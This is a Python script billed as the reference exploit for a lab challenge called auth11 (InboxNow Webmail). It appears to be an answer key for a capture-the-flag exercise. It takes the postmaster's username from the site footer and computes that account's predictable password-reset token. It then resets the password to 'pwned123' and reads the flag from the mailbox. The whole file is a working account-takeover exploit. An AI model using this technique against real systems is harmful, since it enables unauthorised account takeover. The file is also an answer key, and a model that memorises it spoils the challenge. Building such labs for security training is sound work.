#!/usr/bin/env python3
"""Reference exploit for auth11 (InboxNow Webmail).

Reads the postmaster's address off the public footer, confirms the own
reset token (for the seeded "user" account) only resets that account, then
computes postmaster's reset token directly and uses it to set a new
password and read the flag.
"""
import hashlib
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8070")


def reset_token(username: str) -> str:
    return hashlib.sha256(f"reset:{username}".encode()).hexdigest()[:20]


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    landing = s.get(BASE, timeout=5).text
    m = re.search(r"([\w.\-]+)@inboxnow\.local", landing)
    if not m:
        sys.stderr.write("could not find the contact address on the footer\n")
        return 1
    target = m.group(1)

    # Pre-exploit: the seeded user's own reset token must NOT reach the target's mailbox.
    own_token = reset_token("user")
    target_token = reset_token(target)
    if own_token == target_token:
        sys.stderr.write("precondition failed: own token equals target token\n")
        return 1

    r = s.post(f"{BASE}/reset/{target_token}", data={"password": "pwned123"}, timeout=5)
    r = s.get(f"{BASE}/mailbox", timeout=5)
    m2 = re.search(r"flag\{[^}]+\}", r.text)
    if m2:
        print(m2.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
